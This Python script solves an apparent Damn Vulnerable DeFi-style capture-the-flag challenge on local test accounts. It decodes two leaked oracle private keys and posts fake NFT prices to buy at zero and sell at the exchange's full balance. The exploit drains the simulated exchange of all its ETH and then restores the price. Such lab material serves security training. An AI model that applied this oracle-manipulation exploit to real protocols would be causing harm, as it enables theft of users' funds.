from ape import accounts, project
from ape_test.accounts import TestAccount
from ..utils.helper import (
    w3,
    set_balance,
    get_balance,
    ZERO_ADDRESS,
    decode_data_to_private_key,
)

EXCHANGE_INITIAL_ETH_BALANCE = w3.to_wei(999, "ether")
INITIAL_NFT_PRICE = w3.to_wei(999, "ether")
ATTACKER_INITIAL_ETH_BALANCE = w3.to_wei(0.1, "ether")
TRUSTED_SOURCE_INITIAL_ETH_BALANCE = w3.to_wei(2, "ether")

LEAKED_DATA_1 = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35"
LEAKED_DATA_2 = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34"

sources = [
    "0xA73209FB1a42495120166736362A1DfA9F95A105",
    "0xe92401A4d3af5E446d93D11EEc806b1462b39D15",
    "0x81A5D6E50C214044bE44cA0CB057fe119097850c",
]


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    print("\n--- Funding deployer account with 10,000 ether for set up ---\n")
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    print(
        f"\n--- \nOur players:\n⇒ Deployer: {deployer}\n⇒ Attacker: {attacker}\n---\n"
    )

    # initialize the balances of the trusted source addresses
    print("\n--- Initializing the balances of the trusted sources ---\n")
    for source in sources:
        set_balance(source, TRUSTED_SOURCE_INITIAL_ETH_BALANCE)
        assert get_balance(source) == TRUSTED_SOURCE_INITIAL_ETH_BALANCE

    print(
        f"\n--- \nSources:\n⇒ Source 1: {sources[0]}\n⇒ Source 2: {sources[1]}\n⇒ Source 3: {sources[2]}\n---\n"
    )

    # attacker starts with 0.1 ETH in balance
    print("\n--- Initializing the attacker's starting balance ---\n")
    set_balance(attacker, ATTACKER_INITIAL_ETH_BALANCE)
    assert attacker.balance == ATTACKER_INITIAL_ETH_BALANCE

    # Deploy the Oracle and set up trusted sources with initial prices
    print(
        "\n--- Deploying Oracle and setting up trusted sources with initial prices ---\n"
    )
    oracle = project.TrustfulOracle.at(
        project.TrustfulOracleInitializer.deploy(
            sources,
            ["DVNFT", "DVNFT", "DVNFT"],
            [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
            sender=deployer,
        ).oracle()
    )

    # deploy the exchange and get the associated ERC721 token
    print("\n--- Deploying exchange and retrieving associated ERC721 token ---\n")
    exchange = project.Exchange.deploy(
        oracle,
        sender=deployer,
        value=EXCHANGE_INITIAL_ETH_BALANCE,
    )
    nft = project.DamnValuableNFT.at(exchange.token())
    assert nft.owner() == ZERO_ADDRESS  # ownership renounced
    assert nft.rolesOf(exchange) == nft.MINTER_ROLE()

    # define initial balances for exchange and attacker
    exchange_initial_balance = exchange.balance / 10**18
    attacker_initial_balance = attacker.balance / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Exchange: {exchange_initial_balance}\n⇒ Attacker: {attacker_initial_balance}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # get accounts from private keys
    oracle_one_account = w3.eth.account.from_key(
        decode_data_to_private_key(LEAKED_DATA_1)
    )
    oracle_two_account = w3.eth.account.from_key(
        decode_data_to_private_key(LEAKED_DATA_2)
    )

    # create ape native test accounts so we can easily send transactions
    oracle_one = TestAccount(
        index=11,
        address_str=oracle_one_account.address,
        private_key=oracle_one_account.key.hex(),
    )
    oracle_two = TestAccount(
        index=12,
        address_str=oracle_two_account.address,
        private_key=oracle_two_account.key.hex(),
    )
    # manipulate price of NFT so we can buy low
    oracle.postPrice("DVNFT", 0, sender=oracle_one)
    oracle.postPrice("DVNFT", 0, sender=oracle_two)

    # buy NFT and get token ID from logs
    tx = exchange.buyOne(value=1, sender=attacker)
    token_id = [log.tokenId for log in exchange.TokenBought.from_receipt(tx)][0]

    # approve exchange to handle our NFT
    nft.approve(exchange, token_id, sender=attacker)

    # manipulate price of NFT to be original NFT price
    oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE, sender=oracle_one)
    oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE, sender=oracle_two)

    # sell high
    exchange.sellOne(token_id, sender=attacker)

    # set prices back to original NFT price to satisfy ending condition
    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE, sender=oracle_one)
    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE, sender=oracle_two)

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: Attacker drained all the ETH from the exchange ---\n")

    # define ending balances for exchange and attacker
    exchange_ending_balance = exchange.balance / 10**18
    attacker_ending_balance = attacker.balance / 10**18

    print(
        f"\n--- \nEnding Balances:\n⇒ Exchange: {exchange_ending_balance}\n⇒ Attacker: {attacker_ending_balance}\n---\n"
    )

    # exchange must have lost all ETH
    assert exchange.balance == 0

    # attacker's ETH balance must have significantly increased
    assert attacker.balance > EXCHANGE_INITIAL_ETH_BALANCE

    # attacker must not own any NFT
    assert nft.balanceOf(attacker) == 0

    # NFT price shouldn't have changed
    assert oracle.getMedianPrice("DVNFT") == INITIAL_NFT_PRICE

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
